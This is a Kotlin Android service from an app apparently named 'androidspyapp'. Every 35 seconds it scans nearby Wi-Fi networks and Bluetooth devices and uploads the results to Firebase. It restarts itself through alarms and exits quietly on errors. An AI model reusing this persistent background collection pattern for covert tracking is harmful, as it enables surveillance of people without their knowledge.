package com.komnacki.androidspyapp

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.disposables.Disposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlin.system.exitProcess


class MainService : Service() {
    private lateinit var userEmail: String
    private lateinit var userPassword: String

    private var s: Disposable? = null
    private var mWifiManager: WifiManager? = null
    private var mScanResults: MutableList<WifiScanResult> = mutableListOf()
    private var mScanResultsBluetooth: MutableList<BluetoothScanResult> = mutableListOf()
    private var bluetoothAdapter: BluetoothAdapter? = null

    private val mWifiScanReceiver : BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d("KK: ", "mWifiScanReceiver onReceive")
            if(intent != null && intent.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                Log.d("KK: ", "mWifiScanReceiver SCAN_RESULTS_AVAILABLE_ACTION")
                if(context != null && mWifiManager != null) {
                    Log.d("KK: ", "mWifiScanReceiver context!- null && mWifiManager!=null")
                    mWifiManager!!.scanResults.forEach { item ->
                        Log.d("KK: ", "wifiScanResult: " + item.SSID)
                        mScanResults.add(WifiScanResult(context, item))
                    }
                }
            }
        }
    }

    private val bluetoothScanReceiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d("KK: ", "bluetooth register start")

            if(intent != null && intent.action == BluetoothDevice.ACTION_FOUND) {
                Log.d("KK: ", "bluetooth intent and action ok")

//                val mScanResult: List<ScanResult> = bluetoothAdapter.bluetoothLeScanner.flushPendingScanResults()
//            } else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED == action) {
//                bluetoothAdapter!!.startDiscovery()

                val device: BluetoothDevice? = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                // Add the name and address to an array adapter to show in a ListView
                // Add the name and address to an array adapter to show in a ListView
                mScanResultsBluetooth.add(BluetoothScanResult(context!!, device))
            }
        }

    }

    override fun onCreate() {
        super.onCreate()
        Log.d("KK: SERVICE: ", "on create()")

        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            exitProcess(2)
        }

        val prefs = getSharedPreferences(MainActivity.SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val prefsUserEmail = prefs.getString(MainActivity.PREFS_USER_EMAIL, null)
        val prefsUserPassword = prefs.getString(MainActivity.PREFS_USER_PASSWORD, null)
        if (!prefsUserEmail.isNullOrBlank() && !prefsUserPassword.isNullOrBlank()) {
            userEmail = prefsUserEmail
            userPassword = prefsUserPassword
            FirebaseDatabase.getInstance().reference.child(userEmail).keepSynced(true)
            bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.d("KK: SERVICE: ", "on onStartCommand()")

        doWork()
        return START_STICKY
    }

    override fun onLowMemory() {
        super.onLowMemory()
        Log.d("KK: SERVICE: ", "on lowMemory()")
    }

    override fun stopService(name: Intent?): Boolean {
        Log.d("KK: SERVICE: ", "stopService")
        dispose(s)
        return super.stopService(name)
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d("KK: SERVICE: ", "on onBind()")
        return null
    }

    private fun doWork() {
        Log.d("KK: ", "doWork!")
        if(s == null || s!!.isDisposed) {
            s = Observable.just(1)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ action ->
                    val serviceReceiverIntent =
                        Intent(applicationContext, ServiceReceiver::class.java)
                    serviceReceiverIntent.action = Intent.ACTION_DEFAULT

                    val pendingIntent = PendingIntent.getBroadcast(
                        applicationContext,
                        1,
                        serviceReceiverIntent,
                        PendingIntent.FLAG_ONE_SHOT
                    )

                    val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                    val nextAlarmTime = getNextAlarmTime()
                    val prefs = getSharedPreferences(MainActivity.SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
                    val editor = prefs.edit()
                    alarmManager.set(AlarmManager.ELAPSED_REALTIME, nextAlarmTime, pendingIntent)
                    editor.putLong(MainActivity.PREFS_SERVICE_NEXT_ALARM, nextAlarmTime)
                    editor.apply()

                    scanWifiNetwork()
                    scanBluetoothNetwork()

                    writeNew()
                }, { t ->
                    Log.e("ERROR: ", t.toString())
                })
        } else {
            if(s == null) {
                Log.d("KK: ", "s is null")
            } else if(s!!.isDisposed) {
                Log.d("KK: ", "s is disposed")
            }
        }
    }

    private fun scanBluetoothNetwork() {
        Log.d("KK: ", "scanBluetoothNetwork")
        if(bluetoothAdapter != null && bluetoothAdapter!!.isEnabled) {
            Log.d("KK: ", "bluetooth adapter enabled and not null. Receiver register")
            registerReceiver(bluetoothScanReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
            bluetoothAdapter!!.startDiscovery()
        }
    }

    private fun scanWifiNetwork() {
        mWifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        registerReceiver(mWifiScanReceiver, IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION))
        mWifiManager!!.startScan()
    }
    /*@SuppressLint("MissingPermission")
    private fun scanWifiNetwork() {
        ReactiveWifi.observeWifiAccessPoints(applicationContext)
            .subscribeOn(io.reactivex.schedulers.Schedulers.io())
            .observeOn(io.reactivex.android.schedulers.AndroidSchedulers.mainThread())
            .subscribe( {res ->

            }
    );
    }*/

    private fun getNextAlarmTime() = SystemClock.elapsedRealtime() + 35 * 1000

    private fun writeNew() {
        Log.d("KK: ", "writeNew!")
        val messageUtils = MessageUtils.getInstance(this, userEmail)
//        val bluetoothResults = listOf<android.bluetooth.le.ScanResult>()
        messageUtils.sendData(mScanResults, mScanResultsBluetooth)
    }

    private fun dispose(disposable: Disposable?) {
        if (disposable != null) {
            if (!disposable.isDisposed) {
                disposable.dispose()
            }
        }
    }
}